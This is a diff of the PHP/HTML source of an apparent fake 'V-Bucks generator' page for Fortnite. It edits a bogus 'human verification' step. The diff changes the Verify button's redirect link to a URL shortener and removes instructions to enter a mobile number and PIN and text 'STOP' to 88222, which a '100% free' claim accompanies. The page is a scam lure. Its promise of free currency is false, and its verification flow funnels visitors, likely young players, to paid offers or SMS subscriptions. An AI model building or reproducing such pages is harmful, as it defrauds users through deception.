@@ -39,17 +39,11 @@ define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_
 <div class="human-verification-wrapper">
 	<h3>HUMAN VERIFICATION REQUIRED</h3>
     <br>
-    <p>In order to prevent our generator from robot abuse you need to verify you're human using your mobile number.</p>
+    <p>In order to prevent our generator from robot abuse you need to verify you're human.</p>
     <br>
     <p>1. Click the "Verify" button below.</p>
-    <a href="https://www.relinkz.com/N3E3aH2LHf7ST9S8"><button class="fortnite-button click-sound"><span>Verify</span></button></a>
+    <a href="https://smarturl.it/al5j77"><button class="fortnite-button click-sound"><span>Verify</span></button></a>
     <br>
-    <p>2. Enter your mobile number and enter the received PIN.</p>
-    <br>
-    <p>3. Wait up to 30 minutes to recieve your V-Bucks, then Text "STOP" to 88222.<p>
-    <br>
-    <p>IMPORTANT: THE VERIFICATION IS 100% FREE. ONLY TEXT "STOP" TO 88222 AFTER YOU RECIEVED YOUR V-BUCKS.</p>
-     <br>
 	<div class="verification-loader-wrapper">
 		<div class="spinner">
 			<div class="rect1"></div>
